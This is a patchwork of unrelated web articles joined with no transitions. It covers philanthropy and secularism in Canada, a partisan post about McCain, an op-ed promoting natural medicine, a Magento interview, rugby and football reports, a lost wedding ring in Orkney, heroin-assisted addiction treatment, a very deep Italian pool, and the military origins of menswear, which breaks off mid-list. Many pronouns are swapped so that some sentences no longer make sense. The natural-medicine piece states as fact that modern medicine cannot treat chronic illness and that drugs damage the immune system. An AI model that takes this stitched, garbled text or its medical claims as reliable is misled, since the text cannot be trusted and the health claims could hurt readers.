Two weeks ago, at a Walrus Talks event held in Koerner Hall, at the Royal Conservatory of Music in Toronto, eight speakers addressed the topic, “The state of philanthropy: How we're doing it wrong, how it can change for the better, and what giving really means.” The roster included the venue's namesake, philanthropist Michael Koerner; singer-songwriter Molly Johnson; actor-activist Tom Jackson (more on them below), and other orators who described why and how people give. The most sobering presentation was delivered by Gordon Floyd, co-editor of the Canadian quarterly The Philanthropist, who described why an increasing number of Canadians don't give.
Since 1990, Floyd told the audience and those live-streaming the event, the share of Canadian tax filers who claim charitable deductions has gone down by almost 25 percent. A significant driver of this trend is the growing secularization of our society.
These days, only about one in four Canadian donors identifies religious obligation or belief—that “love of humankind” sort of thing—as the motivation for their philanthropy. And that type of motivation is the only one that seems to be in sharp decline…the number of Canadians without a religious affiliation has jumped by a third since 1990…[That's] a big problem for those organizations and causes that depend on philanthropic gifts.
The phenomenon Floyd describes captures one of the paradoxes of progressive thought. On one hand, the modern left celebrates the secularization of society as reason's victory over superstition. Yet it is the religious impulse to care for the less fortunate—through Christian alms, Islamic zakat, Jewish tzedakah, Sikh dasvandh—that motivates the rich to turn over their wealth voluntarily to the needy. At its best, the religious worldview encourages people to see the needs of humanity, or at least large chunks of it, in collective terms.
I'm not a religious person. Nor are most of my friends. In fact, few of the people I know socially or professionally even bother resorting to that wispy dorm-room phrase, “spiritual.” Judging by my Facebook feed, many of my peers do participate in charity drives—but often of the type that involve corporate-branded fun runs, pouring things over their heads, workplace chocolate-bar sales, and other one-off or annual events. The numbers suggest that these fundraising techniques are not an adequate civic replacement for the sustained, morally driven philanthropic culture undergirded by religious faith.
The final, rousing presentation at Koerner Hall on November 25 was delivered by singer, actor, and philanthropist Tom Jackson. They described philanthropy as nothing less, and nothing more, than an outgrowth of simple love.
Jackson spoke of their own transformation from a homeless, drug-using teenager—a process that began when they came across a man lying on Toronto's Dundas Street, unmoving and ignored.
The world was walkin' by, and they were dyin'…On [that] night, I decided to help that guy. You see, the Creator had sent me an angel…I helped that guy and it changed my life…I [too] was dying. I wasn't breathing. I wasn't awake. I was starving for air. And my life changed like that. All of a sudden I was alive…I was addicted to love.
It's telling that, of all the eight Walrus Talks speakers, Jackson (who is Métis) was the only one who spoke directly to their own sense of the divine. Although Canada is now a largely post-religious society, our cultural elites implicitly stake out an exception for Aboriginal spirituality. (If Jackson had said “Jesus” instead of “Creator,” I suspect they would have instantly lost half their audience.)
In fact, many lapsed Christians and Jews I know are far more receptive to the trappings of Eastern, Aboriginal, and New Age spiritual traditions than to their own moribund religious backgrounds. Like many other Canadians, these people are casting about for an alternative way to build a climate of generosity and economic solidarity in a post-Christian country that is being fragmented by social class and chunked up into Internet-mediated cultural silos.
In their speech, Gordon Floyd summarized the problem of secularism with a quote from Alain de Botton to the effect that we all “began to disregard our neighbours at around the same time that we ceased communally to honour our gods.” Finding new ways to build a culture of love-they-neighbour will be one of the defining challenges of this post-religious era.
Can America afford a presidential candidate who has to bring along an economic adviser in order to be coherent on the subject? Not after the last few years of Bush Administration arrogance in the face of failures, it can't.
Especially when that adviser (and rumored to be a leading contender for a McCain Treasury Secretary spot) is former Senator Phil Gramm (TX-Enron), whose out of touch tendencies led to many a Molly Ivins ribbing back in the day?
So what is McCain's economic strategy? Hell if I know — or anyone else for that matter — because it's one big mish-mash, other than the fact that they like to throw out "spend less and tax the wealthy less for trickle down" platitudes like some magic fairy dust. Sounds like someone has a case of Jack Kemp-itis, without actually comprehending its ramifications on anyone not living in a gated community (YouTube) with deep water yacht slips.
What I do know, though, is that the GOP has put this country in a world of shit. And it seems that most Americans understand that all too well:
More than three-quarters of respondents say the country is heading in the wrong direction, up from 63 percent at the start of the year. The last time more than 70 percent of respondents said that was in 1992. Among respondents with more than $100,000 in annual household income, 68 percent said the country is on the wrong track. Those with annual income under $60,000 had the highest levels of dissatisfaction, with more than eight in 10 saying the U.S. is going in the wrong direction. There is a partisan divide in the way people view the country. Slightly more than half of Republicans say the U.S. is headed the wrong way, compared with 87 percent of Democrats.
People see the the cumulative impact of one bad decision after another each and every time they fill up their cars or try to buy food for their families. Including a majority of GOP voters. So, with that in mind, what in the hell were the Republicans thinking trotting out Roy Blunt for some seriously mixed up messaging yesterday?
On CNN's "Late Edition," Republican whip Roy Blunt said, when it comes to taxes, a McCain administration would be in effect a third Bush term. "I think it would be. And I think that's a good thing," they said. (emphasis mine)
Well, even Roy Blunt finds the god's honest truth occasionally spilling out, I suppose…
(YouTube is a DNC ad — McCain thinks the economy is going swimmingly. Probably just looks that way from the Sugar Momma Express.)
War against natural medicine
Posted
Around 400 high profile doctors, medical researchers and scientists recently joined forces to form lobby group Friends of Science in Medicine (FSM) in order to have "alternative medicine" degrees removed from Australian universities.
Chiropractic, osteopathy, Chinese medicine, naturopathy, iridology, kinesiology, reflexology, homeopathy and aromatherapy are some of the courses on their blacklist.
The issue has had significant media coverage, but one question has failed to be properly answered.
Why is a group of prestigious doctors and scientists who have the backing of the most profitable industry in the world according to Fortune 500 – the pharmaceutical industry – targeting a few poorly-funded natural medicine courses?
The official line of the group is that these "alternative medicines" are making Australia look bad and "trashing" the universities' reputation. But is that really the reason? With all the countries and all the universities in the world that provide alternative medicines?
A similar move was made in the UK recently – the British will no longer be able to study certain natural medicine degrees – this does not include chiropractic or osteopathy – at publicly-funded universities from this year. Yet natural medicine has been utilised across Asia and Europe for thousands of years.
The United States and Canada are pioneers of chiropractic as we see it today, providing university courses long before they were ever offered in Australia. Also, nearly 85 per cent of US medical schools offer elective courses in alternative medicines.
According to the World Health Organisation (WHO), 80 per cent of the world's population relies on natural therapies. The figures in Australia are much the same.
So why Australia? What is FSM so worried about?
The group seems to be particularly concerned about an increase in chiropractic courses after it was announced recently that Central Queensland University would be offering a new chiropractic science degree. The move could also be partly to do with the ruling in 2010 that all chiropractors in Australia may use the title 'Doctor'.
FSM has accused what it labels as Australia's "lesser" universities that offer alternative medicine courses of "putting the public at risk".
However, this is a difficult notion to fathom when you compare the tiny number of injuries inflicted on natural medicine patients compared to the hundreds of thousands of deaths recorded each year due to medical errors.
WHO estimates that one in 10 hospital admissions leads to an adverse event while one in 300 admissions leads to death. WHO puts medical errors as among the top 10 killers in the world. According to the US's Institute of Medicine, preventable medical errors kill 98,000 people in the US alone each year and injure countless more.
One of the group's biggest complaints, according to FSM co-founder Emeritus Professor John Dwyer from the University of NSW, is that natural medicine "doesn't strive to be tested". They say that modern medicine is "totally devoted" to taking an "evidence-based approach" and "do good science and do good research into the things we do to people".
The argument that modern medicine is evidence-based as opposed to other types of medicine is an argument that is often used by medical lobbyists, and tends to be generally accepted by the public. However, according to a report by a panel of experts assembled by the prestigious Institute of Medicine, "well below half" of medical care in the US is based on or supported by adequate evidence.
According to the report, between 1993 and 2004 there was a more than 80 per cent increase in the number of medications prescribed to Americans. The panel believes this boom in pharmaceuticals is outpacing the rate at which information on their effectiveness can be generated. "If trends continue, the ability to deliver appropriate care will be strained and may be overwhelmed," the report concluded.
What FSM fails to recognise is that natural medicine courses taught at universities incorporate a much higher level of evidence-based studies, such as health science and human physiology, than if they were to be taught outside of a university.
The Australian universities that have been criticised have all defended their courses, saying they are very much evidence and science-based.
In naturopathy, for example, on top of herbal medicine and nutrition, students also learn the same things that a physiotherapist, medical doctor or nurse learn. As well as chiropractic studies, chiropractors study biology, physiology, neuroscience, anatomy and pathology, for example. These are all scientific studies.
Acting head of RMIT's Health Sciences School Dr Ray Myers has defended its programs as "evidence-based education and practice", saying clinical research of natural medicine treatments are funded by the National Health and Medical Research Council (NHMRC).
If FSM really was so worried about public safety they would not be trying to exclude natural medicine from universities where they are taught with much more of a medical focus. Graduates of these courses are much more likely to refer patients to medical doctors when necessary.
As Nick Klomp, dean of the science faculty at Charles Sturt University, points out, thousands of practitioners already provide alternative medicine and they are very much in demand. "I could ignore them or I could train them better," they said. "We actually create graduates who are much better health care providers. It's all about evidence based, science based."
The other question to ask is just how representative the group is of Australian doctors. Dr Wardle, a NHMRC Research Fellow at the University of Queensland's School of Population Health conducted a survey of every rural GP in NSW and found a third did not refer to alternative medicine providers, a third were incredibly open to it, and a third would refer patients to practitioners that they knew achieved results.
The Australian Medical Association president has withdrawn their support from the lobby group. A number of researchers and doctors have also pulled out of FSM reportedly saying they were not aware of the full picture.
Many Australian medical doctors recognise their limits and refer to natural providers when necessary. However, others continue to believe that modern medicine – which is only 100 years old – is the only way of curing pain.
Natural therapies have been used for more than 10,000 years, and so they deserve a place in society, in Australian universities, and even in modern medicine. According to Australian trauma and general surgeon Dr Valerie Malka, former director of trauma services at Westmead Hospital, while modern medicine is revolutionary when it comes to surgery, particularly in emergencies, for pretty much everything else, traditional, natural or alternative medicine is much more effective.
They say in particular, modern medicine is completely unable to treat or cure chronic illness. Rather than focusing on symptom control, natural medicines work on the body's ability to heal the cause of the illness while modern medicine suppresses the body's healing mechanism with drugs that attack the body's natural defence mechanisms, throwing the immune system out of whack.
Dr Malka believes the attack on natural medicine has more to do with the threat to modern medicine's power base as well as its "unhealthy relationship" with the "trillion-dollar pharmaceutical industry".
This is not the first time natural medicines have been attacked by the medical industry.
Alternative healthcare professionals such as chiropractors, naturopaths, and midwives have been targeted by the American Medical Association (AMA) for nearly a century, in spite of a federal court injunction against the AMA in 1987 for illegally trying to create a monopoly in the healthcare market.
Up until 1983, the AMA had held that it was unethical for MDs to associate with "unscientific practitioners" and they labelled chiropractic "an unscientific cult". They also had a committee on "quackery" which challenged what it considered to be unscientific forms of healing. Five chiropractors including Chester Wilk sued the AMA, claiming that the committee was established specifically to undermine chiropractic.
Wilk won the case, with Judge Susan Getzendanner ruling that the AMA had engaged in an unlawful conspiracy in restraint of trade "to contain and eliminate the chiropractic profession," also saying that the "AMA had entered into a long history of illegal behaviour".
If you look at the history of attacks on natural healthcare providers over the last 100 years, it is difficult not to associate this attack by FSM as the latest attempt to influence the public into believing that natural medicine is, as it says, "quackery" by spreading propaganda that most of the time is simply not true.
"It's just extraordinary that such undisciplined nonsense is being taught in universities around Australia," Mr Dwyer has said.
Why does this group feel that it has the right to talk this way about natural medicines that are ages old and used by 80 per cent of people across the world?
If FSM really was concerned about patient care and safety in Australia, then perhaps it would investigate medical practices which, unfortunately, seriously injure and kill thousands of people every year, rather than target natural medicine.

Close to 30 days after Ben Marks their appointment as Developer Evangelist at Magento Imagine, we got to speak with the man himself. What do they think about their role and what are we in for?
On the off-chance our audience doesn't know who you are, can you introduce yourself in a line or two?
I'm a 6-year veteran of Magento development with 3 years and over 1500 hours spent teaching and consulting for Magento U. I have ten years' experience in PHP development and was a professional drummer for several years.
(…) we have to be brilliant when interacting with business owners and stakeholders
So how does one become a developer evangelist for the Magento platform?
Well, to do it for Magento, Inc., first Magento had to create the job! Actually, we have many evangelists already. These are the people out there making Magento fit for their clients. Anyone can be an evangelist as long as they understand the benefits and the limitations of the platform.
Being an evangelist means knowing when Magento is the right solution or when it can be extended reasonably to meet a requirement. Evangelists have to be good when interacting with developers, but we have to be brilliant when interacting with business owners and stakeholders. That's a rare combination.
Was there a job opening you replied to or were you personally contacted?
Magento Inc. posted the job online in January and then I believe re-opened it later on. After I had a heartfelt conversation with Kevin Eichelberger (owner of Blue Acorn) and received their blessing I submitted my application. I was fortunate to have been part of an organization which helped me grow and then fly away on my own wings, and I've forever indebted to Kevin and all of the great people at Blue Acorn for their guidance and friendship.
Did you have any competition?
Yes. I heard from a couple of my friends that they had applied when the job was first posted. I imagine that there would be several others interested in the position as well.
“Developer Evangelist“; isn't that some sort of buzzword?
It's a newer position in the tech world; perhaps there's an analogue in other industries and at other times. Ultimately the answer comes down to how enabled the position is by the company. My experience thus far tells me that I am quite empowered in this role – I am able to find my own path under amazing guidance from my peers and managers.
eBay is by no means a fast-paced startup anymore. Are you foreseeing any bureaucratic difficulties with your role?
Let's say that I've been pleasantly surprised. In my opinion (a few weeks into the job), Magento, Inc. has retained its startup tenacity & exuberance to get things done. I also see how access to the resources and experience of eBay Enterprise and eBay Inc. helps us to get things done.
That said, when certain things seem to move slowly, it's often because nothing is done in a vacuum within the Magento organization. We have to coordinate efforts across many departments and even organizations.
Ultimately the large eBay family allows us to offer a lot of features, but this can take a little more time. One of the things which I can help to do though is make sure the community is informed about the reasoning for our timelines.
What do you fear will be difficulties as a Developer Evangelist for the Magento platform?
It's a big, big role (we have a large community), and it's difficult to measure success. Fortunately there are several successful developer relations people in our organization (in particular Jonathan LeBlanc and John Lunn from PayPal). I've been in touch with them and with developer relations folks from other companies. Fortunately everyone I've spoken with is genuinely interested in my success.
In the short time span between your appointment and now, we have already heard of great things to come (i.e. a new bug tracker, moving more code to Github) . When do you consider your efforts to be a success?
there will always be room for improvement, especially as times, markets, and technology change
Boy, I wish I could take credit for the bug tracker, as the previous one drove me so crazy that I stopped using it. This change was a long time in the making, and full credit to the teams that made it happen, as the JIRA integration will help make submitters be more informed.
This is just one example of how so many people in the Magento organization have had the exact same ideas and opinions as the community. It just takes someone like me to help us justify how we spend our precious developer and project management resources.
Above all, I know that I'll never reach a moment when I get to say, “I've succeeded.” Part of my job is to help to improve the channels of communication headed into and going out of the company. I doubt that this job will ever be “done” – there will always be room for improvement, especially as times, markets, and technology change.
Is there anything you would like to say before we wish you the best of luck with your future endeavors?
I realize that I am one of the most fortunate people in the world. I get to interact with people all over the world, talking about and helping to improve a platform that I love. I expect to always be held accountable by the community to move things forward. Without a community, there is no Magento – and I'm in a position to make a difference.
We are thankful for Ben Mark's time and honesty. Our personal believe is that he's a good fit for their current role in the Magento ecosphere. In case you want to get in touch, he's easily reachable on Twitter or by email at their first dot lastname at magento.com.
Upcoming Thursday (12th of June), Ben will take part in an “ask-me-anything”-chat on the Magento subreddit – more details will follow.
Say it in 7 - Focus on Preparation
We win business giving them what they want! (We keep business giving them what they need) ©Tim Baynes In the World University Championships, Canada are seen here, as a team, preparing for their final ©Onside Inside Images
Related Articles Great Britain Royals conquer Exeter Sevens title Supreme Australia and France lift World University Championship titles An introduction to Say it in 7 and the Business of Rugby Suggested Topics Brazil, Rio 7s, Sevens Rugby
In our first article in the Say it in 7 series, we take a look at how important preparation is in rugby. We relate it to different aspects of preparation in business and we look at examples in the modern game of why preparation is such a crucial part of rugby.
Fitness and Mentality
Fitness, especially in Rugby 7s, is a key part of preparation. It is vital that each player puts in the time both in the gym and on the training pitch in order to go into a competition in the best shape possible.
Physical preparation is any type of training that addresses the main physical elements. In terms of Rugby 7s, you are focusing on the core areas such as mobility, strength, speed, power and reaction time. All of these aspects need to be focused on to help best prepare an athlete or team in order for them to reach their top performance.
It's easy to see in 7s why the players and teams need to concentrate on these attributes. World Rugby 7s Champions Fiji executes these skills superbly in every single game they play hence why they clinched the title for a second year in a row just recently.
It's clear that preparation is an integral part of all sport. You want to be in the best shape both physically, but also mentally so you can improve in all aspects of the game. The way you feel mentality can often reflect how you feel on the field and how you perform.
England's World Cup disappointment last year might have been down to their mentality. The anxiety and the weight that was on their shoulders could have led to their below par performances.
Preparing in the right way mentality has such an impact on the outcome of performance and results. Against Wales in the pool stages, England were in a comfortable position at half-time and I think their confidence turned into complacency as Wales fought their way back into the contest. Once Gareth Davies had dotted down, England looked shocked and started to panic and ultimately didn't have the answer.
Working the body as well as the mind is an essential part of preparation.
Teamwork
For me, team work is one of the key aspects of preparation. In the first of Tim Baynes' articles they relate teamwork to a business scenario and a PowerPoint presentation:
“This is not about fancy PowerPoint. It is about setting the presentation aside in terms of fussing with it up to the final hour of the meeting, instead hold rehearsals and make sure everyone knows their part and the part of everyone else on the team.”
That element of understanding is crucial. Zack Henry, currently playing for the Great Britain University 7s in the World Championships, described teamwork as key and they believe that it is vital everyone knows their role in order to gain success in a tournament.
On a slightly bigger stage, team work was on show when Scotland and Kenya won their respective 7s competitions on the HSBC World Circuit this season. They perhaps may not have had the strongest squad in terms of quality, but their desire and togetherness was certainly key in them winning their events in London and Singapore respectively.
You have to work as a team to become successful and along with Scotland and Kenya, both Spain's Men's and the Women's 7s sides have shown that in abundance in recent weeks as they have defied the odds to qualify for the Olympic Games in Rio. Again, they may not have been the top team in their competition, but that unity and spirit played a part in them achieving their ultimate goal.
Nutrition and Hydration
With fitness, mentality and teamwork covered, attention turns to how players should look after themselves off the field in terms of nutrition and hydration. This is as crucial as any part of preparation.
Team GB 7s nutritionist Warren Bradley “Getting your nutrition right, will go along with in enhancing your performance."
Warren is referring to both results in the gym and on the field of play when they say this. They enjoy working with the players, but does not travel with the squad. However, they ensure that each programme for their players enables them to refuel and keep in the best shape possible to perform to their highest level.
“It's all about getting that balance right. It's not just about carbs, protein and your calorie intake, it is focusing on all areas of the body for ideal health and performance”, added Warren.
Warren suggests that the timing is key for both eating and drinking as well making sure the right amount of research into what supplements are in the market and what practical solutions players can use is done.
Each player is different meaning some perform better with some supplements than others. In addition to this, Warren provides programmes and suggestions to help players make the right choices in terms of supplements and solutions which in turn, helps the players improve their performance.
Game Plan
When it comes down it, the game plan is the linchpin of preparation. Without the tactical and technical preparation, then success is unlikely. As Tim puts it:
“The client or prospect's background might affect the content and approach of your pitch.” In terms of rugby 7s, the client (being the opposition) might affect the approach of your team.
Coaches, along with the players, will spend hours working on position specific skills and different tactics that will help beat their opponent. Whether you're playing New Zealand or Australia, your approach will be different and its key there is a game plan in place to get the desired result.
Focusing on the key attacking attributes such as gaining possession, creating space and supporting as well as the defending aspects like tackling the ball carrier are vital if goals are to be achieved. In addition to this, selecting the correct players to combat the opposition is also crucial as it could be the main difference in gaining a successful result.
Lewis Baker is thriving in their second season at Vitesse Arnhem and the supporters of Chelsea's sister side have really taken to the midfielder.
Baker is one of four players currently on loan from Chelsea, along with Brazilian midfielder, Nathan, Matt Miazga, Mukhtar Ali.
After scoring in the semi-final of the KNVB against Sparta tonight, Vitesse fans make some serious noise away from home.
The goal was their 13th goal of the season in all competitions, with Vitesse currently sitting seventh in the table.
In a period where the relationship between Chelsea and the Dutch side continues to be questioned, the rise of Baker, who has quickly become a crucial part of their midfield, shows the benefits the link can have between both clubs and players.
The midfielder is highly thought at Stamford Bridge and is likely to get their chance to impress Antonio Conte during pre-season.
A loan move in the Premier League next season could be the final step to making their way into the Chelsea first-team squad.

A woman says they were "stunned" at the "million-to-one chance" discovery of their husband's lost wedding ring on a beach in Orkney.
Paul Higson had been scared to tell their wife Jan they had lost the ring and it took them two months to confess.
They work all over the Orkney mainland and the ring could have been anywhere.
The pair had given up all hope of finding the lost ring until Jan looked down and saw a sparkling object under a stone on the Sands of Wright beach.
Image caption Mr Higson said they thought the ring could have been lost anywhere on mainland Orkney
Mrs Higson, a 49-year-old who works in a primary school, told BBC Scotland: "We walk the dogs at various beaches and Paul works at various places on Orkney mainland so we had just given up.
"We thought that was it."
Image caption Jan Higson spotted something metallic under the stones on the beach
However, on a walk at the Sands of Wright on South Ronaldsay Jan realised they had forgotten to bring poo bags for their dogs, Buddy and Rafn.
Paul went back to the car to collect them.
Jan said: "I stood there with two dogs and just looked down and saw something metallic in the stones.
"I originally thought it was a washer or something like that but I bent down and moved one of the stones because it was wedged under one of the stones and pulled it out and it was Paul's wedding ring."
Image caption The couple take their dogs for walks on the Sands of Wright and other beaches
Mr Higson, 60, who is an environmental consultant, keen birdwatcher and beachcomber, said they had no idea how or when they lost the ring.
When their wife told them they had found it they could hardly believe it.
They said: "I was quite stunned, to be honest, because I thought Jan was joking.
"She showed me the ring and it just fitted straight back on my finger again."
Paul said they had worn the ring for 25 years and knew straight away it was his.
They said: "When you've worn it as long as I have you just know. It fitted perfectly. It was the ring."
They added: "For Jan too just to look down and see it was a million-to-one chance really."
Jan said they put the news of the chance find on Facebook and family and friends were "absolutely stunned".
They said they hope their brilliant luck continues and plans to enter the Euromillions Lottery this weekend.

Camille Bains, The Canadian Press
VANCOUVER - Watching an addict fill a syringe with puddle water, former senior RCMP officer Raf Souccar imagined a radical shift in how Canada could deal with people in the grip of drug addition - by providing them with medical-grade heroin and giving them a chance to survive.
“I've always thought of these people as victims,” they said, recalling the scene in Vancouver's Downtown Eastside, where the man added heroin to the dirty water and injected the contents into their arm.
“I've seen a guy injecting with a needle they were sharpening on the side of the curb,” said Souccar, a former RCMP deputy commissioner who spent 35 years fighting the illicit drug trade and is now concerned about the death toll from the fentanyl overdose crisis, which has killed hundreds of people in Canada this year.
The country's two supervised-injection sites, including Insite, are both in Vancouver. Addicts are provided with clean needles and a nurse who watches over them as they shoot up their own drugs. People who unwittingly overdose on fentanyl-laced substances are given another drug, naloxone, to reverse the effects and then sent to hospital.
Souccar said addicts should be given medical-grade heroin along with housing and mental-health services to save overall health-care costs and money for policing, courts and incarceration.
“I'm not advocating drug use. I'm saying in the situation of people who need help, we need to find a way to help them with quality-control products,” Souccar said from Ottawa.
“I don't think we should just turn our heads and say, 'Continue to be preyed on by drug dealers and we'll just allow you to come in and inject and call an ambulance for you if you overdose.' ”
On the sidewalk in front of Insite, a man pouring milk into a tall plastic container full of cereal said at least 40 people they knew died in the past year from heroin containing the powerful painkiller fentanyl.
Addicts would inject at Insite if a pure form of heroin were provided, said Dale Gonzales, 35.
“I only dropped once and it was a couple of months ago,” Gonzales said of overdosing at a hotel where they were using with three friends a couple of months ago.
“I did my shot and all of a sudden I said, 'Oh shit.' And I freaked out. I blacked out, and they told me I turned blue and everything.” One of their buddies had naloxone, which brought them back to life. Six hours later, they shot up again so they wouldn't get “down sick.”
British Columbia declared a public health emergency in April, after a rising number of fatal overdoses. The coroner's service recorded 622 deaths between January and October, most of them involving fentanyl.
An increasing number of overdoses elsewhere in Canada has cities including Toronto, Montreal, Edmonton and Victoria wanting approval from the federal government to open their own supervised-injection sites. The federal government has introduced a bill to streamline the approval process.
Souccar would like legislation that would permit existing and future supervised-injection sites to dispense medical-grade heroin that must be injected by a doctor, akin to a clinic they visited in Switzerland, where addicts' multiple needs were met.
Souccar, who is part of a nine-member task force that worked on a report examining marijuana legislation for the federal government before the drug is legalized, said the presence of carfentanil - which is 100 times more powerful than fentanyl - in B.C., Alberta, Manitoba and Ontario means government action is urgently needed.
Vancouver's Crosstown Clinic is the only facility in North America that provides injectable heroin, or diacetylmorphine, to chronic addicts who have tried an average of 11 times to kick the habit through other methods including drug-substitution programs that prescribed suboxone or methadone.
Dr. Scott MacDonald, who runs the facility, said Crosstown is modelled after similar programs in eight European countries and that Canada needs to catch up to save lives.
“If we're watching somebody inject, coming into a place like Insite, every day using illicit opioids and forced to engage in the illicit stream of opioids and the illegal activity associated with that, I don't think it's medically, ethically or morally appropriate not to offer them a supervised pharmaceutical-grade option,” they said.
Crosstown currently has 150 clients who also get other support including counselling, housing, nutritious food, services for conditions such as mental health, HIV and hepatitis C, along with job training, MacDonald said.
They said the annual $27,000 cost to treat each addict at Crosstown has spin-off benefits and has kept patients out of a cycle of crime.
“My most recidivist patient at Crosstown has been in and out of jail over 200 times. Since he's had access to treatment here, (it's been) zero. He's been here since 2012, so that's going on four years.”
Dr. Patricia Daly, chief medical health officer of Vancouver Coastal Health, which runs Insite, said discussions to expand the Crosstown model are underway in order to serve “hundreds more people who inject drugs multiple times a day.”
“We're almost standing on the bottom of the waterfall, letting everything come down,” they said, adding fentanyl-related deaths outside the two clinics have continued despite thousands of naloxone kits being handed out at clinics and emergency departments.
“This is the next thing that we'd like to start pursuing here, is how to expand the availability of the legal substitute of this illicit drug,” Daly said of potentially providing pharmaceutical heroin at Insite.
However, current laws do not allow heroin or any drug substitute to be stored at supervised-injection sites, unlike at the high-security Crosstown Clinic, which was granted a special exemption by the federal government, initially for a study.
Daly said they have been in talks with medical health officers across Canada as part of the Urban Public Health Network on how other cities could replicate the model at Insite, where an average of 440 injections take place every day, though they added that entrenched addicts need a more comprehensive program, such as Crosstown.
They said about 80 per cent of the heroin that users voluntarily tested recently at Insite contained fentanyl, but testing is not available for carfentanil, an opiate often used to tranquilize large animals, such as elephants.
IF YOU'RE the type that always heads straight for the deep end, then these amazing snaps showing the world's deepest swimming pool is right up your street.
The Y-40, also known as The Deep Joy, is the incredible swimming pool near Venice in Italy, that has a variety of depths — the deepest is a maximum of 40m.
It is even heated at temperatures between of 32 to 34C so you can dive in just your normal swimming costume rather than having to wear a wetsuit.
The Sun reports the seemingly bottomless pool, which features four underwater caves, broke the Guinness World Record for the deepest pool ever for diving.

Situated inside Hotel Millepini Terme in Montegrotto Terme, it was designed for leisure dives, dive training and of course photo shoots.
It even has ledges and underwater glass viewing panels for those who don't want to get wet.

Adventurous underwater photographer Rino Sgorbani, from Italy, decided to tackle the tricky dive and plunge down to the depths of the pool.
Describing the experience, the 65-year-old said: “In the shallower part it felt like a normal pool.
“The deepest part is like an immersion into the sea depth, but with water as hot as the Caribbean. It was a nice experience and it was exciting.”

The pool, which first opened in 2014, was designed by architect Emanuele Boaretto with the support of Boaretto Group Hotel & Resort, and has a range of underwater activities.
Emanuele said: “Y-40 is the only pool so deep with thermal water: a particularity that cannot to be moved anywhere.

BULLDOGS coach Des Hasler has threatened to send NRL Head of football Todd Greenberg a breach notice after criticising the refereeing as their side spoilt Kurt Gidley's Newcastle farewell at Hunter Stadium.
Hasler is facing the prospect of a $10,000 fine after declaring referee Adam Devcich was “out of their depth the poor fella” following their side's engrossing 20-18 victory.
FRANK'S CRAZY COATHANGER SETS OFF GIDS
DOGS HALFBACK DOES LIGAMENT DAMAGE
“I was pretty disappointed with some of the interpretations of the rules. I didn't know the game had gone back to five metres (in defence),” Hasler said.
“In fact, I think I might send Todd Greenberg a breach notice. In fact I will, for misrepresentation.
“He (the referee) could have done something about it. They were just out of their depth the poor fella.”
And the Bulldogs coach could be in further hot water with suggestions they approached Devcich after the game.

It was a contest worthy of play-offs status.
It was physical and intimidating as the two sides threw everything at each other.
In the end, the Dogs survived a huge scare against a gallant Knights side to remain in the battle for a top four berths.
Gidley, in their 250th and last appearance for the Knights on their home ground, was at their inspirational best, scoring a solo try with just 10 minutes left to get their side to within two points.
But a couple of late errors proved costly for the home side.
The victory came at a cost for the Bulldogs with Hodkinson out of the game after 26 minutes with a wrist ligament injury. But they played down it's severity.
“It should be right, it's just ligaments but I'll have a scan tomorrow,”Hodkinson said.
The Dogs will also have an anxious wait with Frank Pritchard on report for a high tackle on Knights fullback Jake Mamo.
Hasler believed not too many side's would have beaten the Knights.
“It was a pretty ferocious game. It certainly had an intensity about it,” they said.
“I'm very proud of our boys. I don't think many sides probably would have got the points here tonight.
“We had to play really tough tonight. It was very physical. It was a brave effort
Given the hype around Gidley's milestone game, it was no surprise to see the Knights start the game at a frenetic pass.
And the speed of their defensive line and numbers in the tackle rattled the Dogs early.
There was plenty of feeling too with the sides trading penalties after Kade Snowden was placed on report for the Knights for a swinging arm on Greg Eastwood and Bulldog Frank Pritchard catching Jake Mamo with a coat-hanger and also on report.
The Knights got on the board first after a Gidley kick found open space and evaded Brett Morris for Tariq Sims to score in the corner.

Gidley nailed the sideline conversion for a 6-0 lead.
Newcastle appeared well on top in the opening 20 minutes but the momentum shifted dramatically on the back of a Mamo cut-out pass.
It was meant for Aku Uate and the unmarked winger would have scored had it found him.
Instead, Bulldogs try-scoring machine Curtis Rona plucked it out of the air and raced 95 metres to score.

The try set the home side back on its heels and just six minutes later, the Knights found themselves trailing when Hodkinson put their centre Tim Lafai over with the halfback leaving the field with the wrist problem.
A brilliant individual 35 metre try from dummy half from Bulldogs hooker Damien Cook brought up the halftime score.

On the back of half time instructions from caretaker coach Danny Buderus to not die wondering, the Knights threw everything at the Dogs and were finally rewarded when winger Nathan Ross reeled in a Tyrone Roberts grubber to score just inside the dead-ball line.
It reduced the deficit to just two points but the Bulldogs gave themselves more breathing space when Frank Pritchard crossed off a second man play for a 20-12 scoreline with 17 minutes left.

The military of the world have had an unmistakable impact on fashion. Whether it be the varied terrain, weather encountered, or nature of living in one's uniform, over the last several hundreds of years these factions have become responsible for pieces that don't just merely take up real estate in the closet, they are cornerstones of menswear. Here are but a few staples that deserve a crisp salute.
The Necktie
According to The New York Times, “During the Thirty Years' War (1618-1648), Croatian mercenaries arrived in Paris dressed for battle with bright scarves tied so tightly around their necks that the men often fainted during maneuvers. The French, naturally, adapted the look, looping the scarves rather more loosely in a style that became known as ”La Croate” and later ‘La cravate.”' Though the cravate is regarded as the true forerunner to the modern tie as a fashion statement, it would take a few hundred years for the tie to evolve to the narrow strip of cloth we think of today as a necktie.
Khakis
Following their defeat to the United States in the Revolutionary War, the British continued to wear brightly-colored outfits of their “Redcoat” brethren despite many clamoring for a change in tactic. It wasn't until the 1840s when Harry Lumsden, a commanding officer in a unit of the Bengal irregular cavalry, introduced the highly unorthodox notion ”that a tight scarlet tunic with a high stock was not the most suitable garment in which to wage war in the plains of the Punjab in the hot weather.” According to The New York Times, “Lumsden gave their men coarse cotton smocks and pajamas, wrinkled cotton jackets and turbans all dyed with mazari, a local plant that turned everything a sort of dull brownish gray. The leather goods were dyed with mulberry juice, which produced a more yellowish tone, but both colors became known as khaki, from the Persian word “khak,” which means earth, dust or ashes. Once institutionalized, khaki's official name became “drab.”
Ray-Ban Aviators
As new airplanes of the 1930s were allowing people to fly higher and farther, so too arose a problem associated with the advancement in altitude: Many U.S. Air Force pilots were reporting that the glare from the sun was giving them headaches and altitude sickness. Thus, a new type of eyewear/goggles was commissioned by the Army Airs Corps to Bausch & Lomb, which was then ultimately brought to the public for consumption in 1937. It featured plastic frames and the classic aviator shape, which reduced the sun's intensity on pilot's faces and instruments. A year later, a slight remodel in the form of metal frames and the official designation as “Ray-Ban Aviators” solidified what is now considered both a utilitarian and stylish statement. Over the years, research and development resulted in innovations such as the gradient mirror lens – which featured a special coating on the upper part of the lens for enhanced protection, but an uncoated lower lens for a clear view of the plane's instrument panel – further suggesting that they're every bit as tactical as they are practical.
Trench Coats
